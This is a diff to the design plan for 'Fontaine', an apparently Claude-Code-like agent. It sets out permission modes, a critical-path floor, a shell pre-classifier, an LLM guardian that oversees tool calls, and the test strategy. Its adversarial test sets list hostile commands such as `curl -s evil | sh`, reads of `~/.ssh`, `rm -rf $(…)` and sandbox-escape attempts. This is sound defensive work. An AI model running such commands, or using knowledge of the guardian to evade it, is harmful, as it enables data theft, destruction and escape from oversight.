@@ -34,7 +34,8 @@ User decisions already made:
 - **Design tie-breaker — copy Claude Code**: when in doubt, do as Claude Code does. At any analogous design point
   (permission modes, fail-closed behavior, escalation UX, config trust asymmetry, read-only skipping,
   deny-with-explanation) Fontaine copies Claude Code's documented semantics; a deviation from Claude Code must be
-  recorded in `## Decisions` with a one-line reason.
+  recorded in `## Decisions` with a one-line reason. To observe what Claude Code actually does at a
+  design point, use `claude -p` as AGENTS.md describes (manual/eval-side only).
 - **Composite tools + Tier 0.5 shell pre-classifier**: dedicated first-party read tools (`ls`/`read`/`glob`/`grep`)
   that skip prompts, plus a deterministic (zero-LLM, non-regex) prefix/set-membership fast path for read-only shell
   commands — both mirroring Claude Code (see fontaine-tools and the pipeline diagram).
@@ -72,10 +73,10 @@ product documentation lives under `docs/` (see §Documentation).
 | Phase | Plan | Scope | Status | Exit milestone |
 |-------|------|-------|--------|----------------|
 | 0 — scaffold (eval first) | [phases/phase0_scaffold.md](phases/phase0_scaffold.md) | Cargo workspace, crate skeletons, CLI entry, tracing, CI, config loading; eval golden-dataset + runner skeleton; `docs/` tree started | not started | CI green; eval runner green against verdict fixtures with no guardian in the tree |
-| 1 — model layer + headless | [phases/phase1_model_headless.md](phases/phase1_model_headless.md) | rig crates pinned; config → provider mapping; streaming spike; `fontaine -p`; provider docs | not started | full tool round-trip headless via `-p` (Phase-5-draft denial semantics) |
+| 1 — model layer + headless | [phases/phase1_model_headless.md](phases/phase1_model_headless.md) | rig crates pinned; config → provider mapping; streaming spike; `fontaine -p`; provider docs | not started | `fontaine -p` streams a prompt plus a spike tool round-trip against a mock endpoint |
 | 2 — agent runtime & tools | [phases/phase2_runtime_tools.md](phases/phase2_runtime_tools.md) | RiskClass registry, GuardedTool (gate stubbed), rig-tools built-ins + read tools + webfetch, scope validator, shell hardening; rig-agent session orchestration; `docs/tools.md` | not started | agent runs tools end-to-end headless through wrapped registry; choke-point test green |
-| 3 — pipeline & manual TUI | [phases/phase3_pipeline_tui.md](phases/phase3_pipeline_tui.md) | PermissionPipeline (manual/acceptEdits/plan/dontAsk; deterministic floor; Tier-0.5; audit log); ratatui TUI; `docs/permissions.md` + pipeline diagram | not started | **usable Claude-Code-like agent with manual approvals** |
-| 4 — guardian + scorecard | [phases/phase4_guardian.md](phases/phase4_guardian.md) | fontaine-guardian; `auto` wired into pipeline; denial UX; live evals; **published scorecard**; `docs/guardian.md` + `docs/evals.md` | not started | shipped default flips `manual` → `auto`; scorecard public with the release |
+| 3 — pipeline & manual TUI | [phases/phase3_pipeline_tui.md](phases/phase3_pipeline_tui.md) | PermissionPipeline (manual/acceptEdits/plan/dontAsk; deterministic floor; Tier-0.5; audit log); headless `-p` denial semantics for manual/dontAsk; ratatui TUI; `docs/permissions.md` + pipeline diagram | not started | **usable Claude-Code-like agent with manual approvals** |
+| 4 — guardian + scorecard | [phases/phase4_guardian.md](phases/phase4_guardian.md) | fontaine-guardian; `auto` wired into pipeline (incl. headless `-p` semantics for auto); denial UX; live evals; **published scorecard**; `docs/guardian.md` + `docs/evals.md` | not started | shipped default flips `manual` → `auto`; scorecard public with the release |
 | 5 — extensibility | [phases/phase5_extensibility.md](phases/phase5_extensibility.md) | MCP; session persistence; parallel subagents (v1) + budgets + agents panel; `docs/mcp.md` + `docs/agents.md`; sandbox/sandboxing.md = **roadmap slot** | not started | gated background subagents live in one session |
 | 6 — guardian hardening | [phases/phase6_hardening.md](phases/phase6_hardening.md) | tool-result scanner (PromptGuard 2 ONNX default, BYO interface, cheap-LLM fallback); scanner docs | not started | scanning demonstrable behind config, license caveat surfaced |
 
@@ -93,8 +94,11 @@ phase plan are the work trail).
 Built **on rig**: Fontaine crates are the guardian, the permission pipeline, config, and surfaces.
 The model layer, agent runtime, memory/compaction, base tools, and MCP come from rig crates.
 Per the micromegas convention, the Cargo workspace lives at `rust/Cargo.toml` and **every crate
-sits directly under `rust/`** — the repo root holds only `rust/`, `evals/`, `docs/`, `tasks/`,
-`research/`.
+sits directly under `rust/`** — the root directories are only `rust/`, `evals/`, `docs/`, `tasks/`,
+`research/`, plus root files `README.md`, `LICENSE`, `CHANGELOG.md`, `AGENTS.md` and
+`.github/workflows/ci.yml` (GitHub Actions; from `rust/` it runs `cargo fmt --check`,
+`cargo clippy --all-targets -- -D warnings`, `cargo test`, then the offline eval fixture run — see
+§Testing Strategy).
 
 ```
 fontaine/
@@ -113,8 +117,9 @@ fontaine/
 │   │                           #   interrupt, per-type tool registries, budgets (v1)
 │   ├── fontaine-mcp/           # rig-rmcp wiring: MCP servers from config, tools registered
 │   │                           #   as RiskClass::Arbitrary, annotations → guardian hints
-│   └── fontaine-tui/           # ratatui app: chat, approval prompts, denial/retry UI, modes
-├── evals/                      # Phase-0 golden dataset + guardian scorecard runner
+│   ├── fontaine-tui/           # ratatui app: chat, approval prompts, denial/retry UI, modes
+│   └── fontaine-evals/         # eval runner (bin crate): scores guardian verdicts against the dataset
+├── evals/                      # golden dataset (`evals/dataset/*.jsonl`) + README; runner is rust/fontaine-evals
 ├── docs/                       # all product docs — one topic per page, website-ready (see §Documentation)
 ├── tasks/                      # this master plan + phases/ (one plan per phase)
 └── research/                   # six analysis/research companion docs
@@ -140,13 +145,21 @@ parallel agents + agents panel (Phase 5), result scanning (Phase 6).
          PermissionPipeline (fontaine-core, inside GuardedTool::call)
            1. registry.lookup(name) → RiskClass
            2. Deterministic floor — evaluated BEFORE the mode branches, in EVERY mode (no mode,
-              flag, or verdict reaches past it; order: deny → ask → critical-path):
+              flag, or verdict reaches past it; it can only prompt or deny, never allow; order:
+              deny → ask → critical-path → protected-path):
               `[permissions] deny` rule match → Deny; `[permissions] ask` rule match → force the
-              human prompt (even in `auto`; a match in `dontAsk` denies); critical-path structural
-              check → block destructive ops on the never-auto-approved paths (filesystem root `/`,
-              top-level dirs, home, the working directory and its parents, /etc, $HOME, `.git`,
-              dotfiles — Claude Code's critical-path list). All structured matching (tool name +
-              risk metadata + path containment), never regex on raw args.
+              human prompt (even in `auto`; a match in `dontAsk` denies); critical-path check →
+              `rm`/`rmdir` targets that are the filesystem root, a top-level dir, home, or the
+              working directory or one of its parents force the human prompt in
+              manual/acceptEdits/plan/auto (never auto-approved by any mode or verdict) and Deny in
+              `dontAsk`; protected-path check (a separate list: `.git`, dotfiles) → writes prompt in
+              manual/acceptEdits, go to the guardian in `auto`, Deny in `dontAsk` (Claude Code's
+              protected-paths behavior). In headless `-p` every prompt outcome is a Deny. All
+              structured matching (tool name + risk metadata + path containment), never regex on raw
+              args. For `shell` calls the critical-path check lexes the command with the same shlex
+              lexer as Tier 0.5 and inspects the targets of every `rm`/`rmdir` word (exact word
+              equality); a target it cannot resolve (command substitution, variable-rooted glob), or
+              a command that fails to lex while containing such a word, is treated as critical.
            3. mode == plan?  → no edit ever executes: ReadOnly-in-scope and Tier-0.5-eligible
               calls proceed (steps 4–5); everything else reaches the terminal plan-mode branch 9.
               Structurally blocked = WorkspaceWrite / edit-class only; write-capable/unparsed
@@ -187,6 +200,16 @@ parallel agents + agents panel (Phase 5), result scanning (Phase 6).
   gated at steps 6–9 like any other; every tool call the subagent then makes re-enters this same
   pipeline)
 ```
+
+**Pipeline inputs**: mode, task intent, recent user messages, session facts, prior denials, the
+audit-log sink, and the human-approval callback reach `GuardedTool::call` through a shared
+`SessionState` injected into every wrapper at registration (see the Phase 2 plan).
+
+**Headless (`-p`)**: nothing prompts. Every would-prompt outcome — `ask`-rule match, Escalate
+verdict, low-confidence escalation, critical-path/protected-path prompt, loop breaker — becomes a
+Deny returned to the agent as the tool_result, and the run continues (Claude Code parity). Exit
+codes: 0 run completed (denials do not change it), 1 run error (provider/model failure,
+interruption), 2 config or usage error.
 
 ### Composite guardian (the guardian tree)
 
@@ -279,7 +302,9 @@ subagent_cost_budget_usd = 2.0    # per-subagent spend cap (same enforcement)
                                   #   inherited, session ladder dontAsk < manual < acceptEdits <
                                   #   auto; `plan` is a session-root interactive posture, not a
                                   #   child mode; plan/acceptEdits/auto are reachable for a child
-                                  #   only via `inherit` from a parent already there); a type's
+                                  #   only via `inherit` from a parent already there); a child's
+                                  #   effective mode is re-evaluated on every call as the tighter
+                                  #   of its own setting and the parent's current mode; a type's
                                   #   toolset is always a subset of the parent's
   explore = { model = "$guardian_default", tools = ["ls", "read", "glob", "grep"] }
   worker  = { model = "$main", tools = ["ls", "read", "glob", "grep", "edit", "write", "shell"] }
@@ -303,6 +328,19 @@ own guardian. Tier-0.5 `[shell_preclassifier]` extensions are loosening, so they
 rule: user-scope config only, never project-scope. `[guardian] profile` follows it too — a loosening
 knob (minimal vs full), user-scope only, and no value of it disables the guardian.
 
+Per-key scope (a project file that sets a user-scope-only key is rejected at load):
+
+| Key | Project scope |
+|-----|---------------|
+| `[model]` `provider`, `model`, `base_url` | no — user only |
+| `[guardian]` `model`, `profile`, `timeout_secs`, `confidence_threshold`, `cache`, `scan_tool_results` | no — user only |
+| `[permissions]` `default_mode` | no — user only |
+| `[permissions]` `deny`, `ask` | yes — add only |
+| `[auto_mode]` `environment`, `allow` | no — user only |
+| `[auto_mode]` `soft_deny`, `hard_deny` | yes — add only |
+| `[agents]` `max_parallel`, budgets; `[agents.types]` | no — user only |
+| `[shell_preclassifier]` `allow_extra` | no — user only |
+
 ## Research Findings (prior art this design is grounded in)
 
 ### Claude Code auto mode (the feature being replicated, and its exact semantics)
@@ -321,7 +359,7 @@ From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-
   injected content can argue to the classifier directly. A separate server-side probe scans
   incoming tool *results* for suspicious content before the agent reads them.
 - **Decision order**: explicit `deny` rules → explicit `ask` rules (always prompt, even in auto) →
-  read-only skip → critical-path removals (`rm -rf /`, `~`) never auto-approved → classifier.
+  read-only skip → critical-path removals (`rm -rf /`, `~`) always prompt, never auto-approved → classifier.
 - **Fail-closed**: if the classifier request fails, times out, or returns no parseable verdict, the
   action is **denied**, never run unreviewed.
 - **Denial UX**: the agent receives the denial reason (e.g. `[Data Exfiltration]`, `[Production
@@ -510,7 +548,8 @@ workspace.package block; rig crates pinned);
 `rust/fontaine-agents/src/{lib,spawn,registry,budget}.rs`;
 `rust/fontaine-tui/src/{app,transcript,approval,denials,statusbar,agents_panel}.rs`;
 `rust/fontaine/src/main.rs`; `docs/{index,architecture,configuration,tools,permissions,guardian,evals,tui,mcp,agents,sandboxing}.md`;
-`README.md`; `evals/` dataset + runner. Each phase plan lists its own file slice in dependency
+`README.md`, `LICENSE`, `CHANGELOG.md`, `.github/workflows/ci.yml`; `evals/` dataset +
+`rust/fontaine-evals/` runner. Each phase plan lists its own file slice in dependency
 order. No `fontaine-llm` crate — the model layer is rig.
 
 ## Trade-offs
@@ -656,7 +695,9 @@ carries the reasoning:
   `mode` key, default `"inherit"`; an explicit per-type `mode` may only be `manual` or `dontAsk`
   (tighten-to-interactive-only); session ladder `dontAsk < manual < acceptEdits < auto` (`plan`
   removed — a session-root interactive posture, not a child mode); `plan`/`acceptEdits`/`auto`
-  reachable for a child only via `inherit` from a parent already there.
+  reachable for a child only via `inherit` from a parent already there. A child's effective mode
+  is re-evaluated on every call as the tighter of its own setting and the parent's current mode, so
+  a parent that tightens mid-session tightens its children.
 - 2026-10-21: deliberate Claude-Code deviation — `acceptEdits` auto-approves Fontaine's edit-class
   tools only; Claude Code's acceptEdits also auto-approves in-scope filesystem Bash (`mkdir`,
   `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`), while Fontaine keeps those `Arbitrary`-class shell
@@ -673,11 +714,14 @@ carries the reasoning:
 - 2026-10-21: plan mode follows Claude Code's default (classifier reviews consequential non-edit
   calls; `useAutoModeDuringPlan` is on by default) — edits structurally blocked regardless of
   verdict.
-- 2026-10-21: deterministic `[permissions] deny` rules and the critical-path structural check
-  gate every mode — never-auto-approved destructive ops are structurally blocked, matching Claude
-  Code's critical-path list (filesystem root `/`, top-level dirs, home, cwd and its parents,
-  `/etc`, `$HOME`, `.git`, dotfiles) — independent of any bypass mode (structured tool/path
-  matching, not arg regex). Floor order: deny → ask → critical-path.
+- 2026-10-21 (revised): deterministic `[permissions] deny`/`ask` rules and the critical-path and
+  protected-path checks gate every mode and can only prompt or deny, never allow. Critical-path
+  (`rm`/`rmdir` targets: filesystem root, top-level dirs, home, cwd and its parents) forces a human
+  prompt — never auto-approved by any mode or verdict — and denies in `dontAsk` and headless;
+  `.git` and dotfiles are a separate protected-path write list (prompt in manual/acceptEdits,
+  guardian in `auto`, deny in `dontAsk`), matching Claude Code; independent of any bypass mode
+  (structured tool/path matching, not arg regex). Floor order: deny → ask → critical-path →
+  protected-path.
 - 2026-10-21: deliberate Claude-Code deviation — config trust asymmetry is looser than Claude
   Code on the deny side: CC ignores the whole `autoMode` block from project settings (no denies
   from checked-in files); Fontaine lets a project repo at least add deny-side rules (reason:
@@ -713,6 +757,8 @@ carries the reasoning:
   `tasks/phases/` (a Phase 0–6 numbering; each phase plan ends with a docs step — documentation
   is a per-phase deliverable, all of it under `docs/`, the website-ready home for product prose).
   (User directive.)
+- 2026-10-21: the eval runner is the workspace bin crate `rust/fontaine-evals` (keeps the "every
+  crate sits under `rust/`" rule); the dataset stays in `evals/dataset/` as JSONL.
 
 ## Documentation
 
@@ -749,25 +795,31 @@ delivered (or extended) by the docs step of the phase named with it — see the 
   `[guardian] profile = "minimal"` — the escape classes minimal must still deny.
 - `evals/README.md`: golden-dataset format + runner usage (Phase 0) — the dataset is a public
   asset, so its format doc ships with it.
-- `CHANGELOG.md`: release notes (every phase from its exit milestone on; plan/phase citations
-  belong here, not in the docs pages).
+- `CHANGELOG.md`: release notes — created in Phase 0; every phase appends an entry in its docs step
+  (plan/phase citations belong here, not in the docs pages).
 
 ## Testing Strategy
 
 Unit tests (using `rig_core::test_utils` deterministic completion models — no live APIs):
 - **model wiring**: config → rig provider-client mapping (provider choice, base URLs, env keys,
   guardian-model override); rig itself owns and tests SSE parsing/delta accumulation, so we test
-  only our mapping layer, with one smoke test per provider against a `wiremock` OpenAI-compatible
-  endpoint to catch wiring regressions rig's tests can't see.
+  only our mapping layer, with one smoke test per provider against a `wiremock` endpoint speaking that
+  provider's wire format (Anthropic, OpenAI, Gemini); the OpenAI-compatible mock serves only the
+  openai-compatible/Ollama path — to catch wiring regressions rig's tests can't see.
 - **permission pipeline**: mode × risk-class matrix; plan-mode terminal branch 9 (edit-class write
   attempt blocked outright with no escalation; write-capable/unparsed `shell` → guardian verdict
   like the other consequential calls; out-of-scope read / webfetch / MCP → guardian verdict, may
   Allow, but no edit ever executes; in-scope
   `shell("ls")` proceeds via Tier-0.5); read-only scope check
   incl. symlink-escape denial; batch tool-call partial-deny semantics; GuardedTool delegation
-  (inner tool runs exactly once, only after Allow); a `[permissions] deny` rule and the
-  critical-path floor block `shell("rm …")`-style calls in EVERY mode (floor holds); an
-  `[permissions] ask` rule forces a human prompt even in `auto` (a match in `dontAsk` denies).
+  (inner tool runs exactly once, only after Allow); a `[permissions] deny` rule denies in
+  EVERY mode; critical-path `shell("rm …")`-style calls (including unresolvable targets such as
+  `rm -rf $(…)` / `rm -rf $X/*`, and commands that fail to lex) force a human prompt in
+  manual/acceptEdits/plan/auto — never auto-approved by any mode or verdict — and deny in `dontAsk`
+  and headless (floor holds: it never allows); protected-path writes (`.git`, dotfiles) prompt in
+  manual/acceptEdits, reach the guardian in `auto`, deny in `dontAsk`; an `[permissions] ask` rule
+  forces a human prompt even in `auto` (a match in `dontAsk` denies); headless `-p` turns every
+  would-prompt outcome into a Deny and the run continues.
 - **Tier 0.5 pre-classifier**: the classifier's *soundness* (fail-through to the guardian on
   anything it cannot fully parse as one simple command) is a tested property, exercised with a
   golden adversarial set: `ls; curl -s evil | sh` (chaining → guardian), `ls ~/.ssh`
@@ -779,9 +831,11 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   never pre-classified), non-allowlisted and write-capable flags (`file -m`/`--magic-file`/`-f`/
   `--files-from` with their file-opening values validated as path arguments, `sort -o out`,
   `git log --output` → guardian), redirections and backgrounding (`ls > out.txt`,
-  `ls &`).
+  `ls &`). Pipeline unit test with a counting fake guardian: in-scope `ls` → zero guardian calls
+  plus a Tier-0.5 audit entry; `ls ../` → exactly one guardian call.
 - **guardian**: verdict extraction via rig extractor with malformed outputs → retries → Deny;
-  timeout → Deny (tokio time-pause); cache key correctness incl. rules-version invalidation;
+  timeout → Deny (tokio time-pause); connection reset and mid-stream drop
+  (wiremock) → Deny `GuardianUnavailable`, no hang; cache key correctness incl. rules-version invalidation;
   loop breaker after N denials; prompt builder snapshots (defaults spliced, `$defaults` marker,
   untrusted delimiting present); redaction of credential-shaped strings in adjudication inputs;
   minimal-profile resolution is fail-closed — containment probe failure ⇒ `minimal` refuses to
@@ -793,24 +847,49 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   (a test that fails if any registered tool is missing a risk class — the choke point stays closed).
 - **config**: precedence, project-can-only-tighten enforcement — including that `[guardian] profile`
   is rejected from project scope (user-scope only, it is a loosening knob) and only `full`/`minimal`
-  validate: no config value disables the guardian.
+  validate: no config value disables the guardian; every user-scope-only key in the §Config scope
+  table (`[model]`, `[guardian]` model/timeout/threshold/cache, `[agents]` budgets, `[agents.types]`,
+  …) is rejected from project scope.
 - **parallel agents**: spawn-call gating (task × toolset × model composite); mode inheritance
-  invariant (child effective mode ≤ parent, never looser); per-type registry is a subset of the
-  parent's; budget caps stop a subagent; subagent results pass the tool-result scanner path;
-  `SendMessage`-style peer messages hit the same gate.
+  invariant (child effective mode ≤ parent, never looser), including a parent that switches mode
+  mid-run (the child's next call uses the tighter of its own setting and the parent's new mode);
+  per-type registry is a subset of the parent's; budget caps stop a subagent; subagent reports
+  return as ordinary tool results through the shared result-handling hook; `SendMessage`-style peer
+  messages hit the same gate; with deterministic `test_utils` models (or cassettes), spawn N
+  subagents, kill one, and assert the others complete and every tool call has a gate decision in
+  the audit log keyed by agent id.
 
 Integration — driven through the headless `-p` surface (Phase 1, step 2): full agent runs are
 recorded and replayed with `rig-cassette` — record a real session once
 (prompt → stream → tool call → guardian verdict → execute → result → answer), replay it
-deterministically in CI; plus a fail-closed test where the guardian endpoint 500s (wiremock) and
-the tool call is denied. Cassette replay is what makes the end-to-end loop CI-able without live
-models or flaky network.
+deterministically in CI; plus a fail-closed test where the guardian endpoint 500s, resets the
+connection, or drops mid-stream (wiremock) and the tool call is denied. Cassette replay is what
+makes the end-to-end loop CI-able without live models or flaky network. Cassettes live in
+`rust/fontaine/tests/cassettes/`; recording scrubs API keys, auth headers, and home-directory paths
+through rig-cassette's scrubbing configuration, and runs only via
+`FONTAINE_RECORD=1 cargo test -p fontaine --test cassettes -- --ignored` with the provider key env
+var set (record tests skip without it); replay is the default and needs no keys.
 
 Eval harness (scaffolded in Phase 0, scorecard published with the guardian in Phase 4; run
 manually / nightly, not CI-gated on live models): golden dataset scored
 against live guardian models; catches prompt regressions unit fixtures can't — specifically
 guardian *judgment quality* (false-deny rate on benign commands, catch rate per attack class).
 This is the tier where "89% vs 13.6%" style claims get verified for whatever model the user picks.
+Runner: the workspace bin crate `rust/fontaine-evals`, run from `rust/` as
+`cargo run -p fontaine-evals -- --dataset ../evals/dataset --guardian fixture`; it scores the
+selected guardian's verdict for each case against `expected` (live modes adjudicate through the same
+core as `fontaine -p`). Dataset: `evals/dataset/*.jsonl`, one JSON object per line with `id`,
+`category` (benign | attack:<class> | injection-in-args | ambiguous-intent | tier05-adversarial |
+spawn | minimal-escape | minimal-benign), `profile` (`full` | `minimal`), `task_intent`, `tool`,
+`args`, `expected` (`allow` | `deny` | `escalate`), and `fixture_verdict` (the canned verdict the
+offline `fixture` guardian returns). `--guardian fixture` is offline and deterministic — it is the
+CI step (schema validation + scoring); `--guardian live:<model>` is the manual/nightly mode.
+
+Differential baselines (manual/eval-side only — never unit/integration tests or CI, per AGENTS.md):
+run `claude -p --permission-mode <mode>` over the Tier-0.5 adversarial set and the floor/headless
+cases (critical-path, protected-path, ask/deny) and capture its decisions as golden fixtures under
+`evals/baselines/`; Fontaine's decisions are diffed against them and each divergence is fixed or
+recorded in Decisions.
 Golden-set additions for the `minimal` profile column (scored before it ships, same harness):
 container-mode benign cases — routine workspace ops proceed ungated-ish (no full-context
 adjudication) — and escape-focused cases (`mount /dev/sda1`, docker.sock write, cgroup
@@ -830,19 +909,13 @@ End-to-end checks, each owned by the phase's definition of done (owner in parens
    `[Download+Execute]` shown inline.
    (End-to-end guardian judgment against a live model — the core value proposition.) (Phase 4)
 3. `/denied` → the curl action is listed → `r` → agent is told it may retry. (Retry UX.) (Phase 4)
-4. Kill network mid-adjudication → denial with `GuardianUnavailable`, no hang. (Fail-closed.) (Phase 4)
-5. Same session against Ollama (local model as both agent and guardian) → checks 2–4 hold.
+4. Same session against Ollama (local model as both agent and guardian) → checks 2–3 hold.
    (Model-agnostic guarantee.) (Phase 4)
-6. `auto` mode: `shell("ls")` inside the workspace completes with **no guardian round-trip** — the
-   audit log shows a Tier-0.5 Allow and zero guardian calls; `shell("ls ../")` falls through to the
-   guardian (out-of-scope). (Tier-0.5 fast path + containment boundary.) (Phase 3 builds the fast
-   path; Phase 4 verifies it end-to-end against live judgment)
-7. Spawn 4 parallel subagents (the default `max_parallel`), kill one mid-run → the other three
-   complete and report back as tool results; the killed one's row shows its state; every spawn and
-   every surviving subagent tool call shows its own gate decision (Tier-0.5 Allow or guardian
-   verdict) in the audit log, keyed per agent; the killed agent's budget accounting is visible in
-   the background-agents panel. (Parallel orchestration gates + per-agent audit.) (Phase 5)
-8. Run under srt (or bubblewrap) with `[guardian] profile = "minimal"`: `shell("ls")` in the
+5. Spawn 4 parallel subagents (the default `max_parallel`), kill one mid-run → the killed one's row
+   shows its state and its budget accounting is visible in the background-agents panel. (Visual
+   panel check only; gating, per-agent audit, and survivor completion are covered by the automated
+   parallel-agents test.) (Phase 5)
+6. Run under srt (or bubblewrap) with `[guardian] profile = "minimal"`: `shell("ls")` in the
    workspace completes via Tier-0.5 Allow with reduced-context adjudication for the rest; an
    attempted escape (`mount /dev/sda1`, docker.sock write) is **Denied by the minimal guardian**,
    audit entry naming the escape class; kill the containment probe (run minimal without srt/
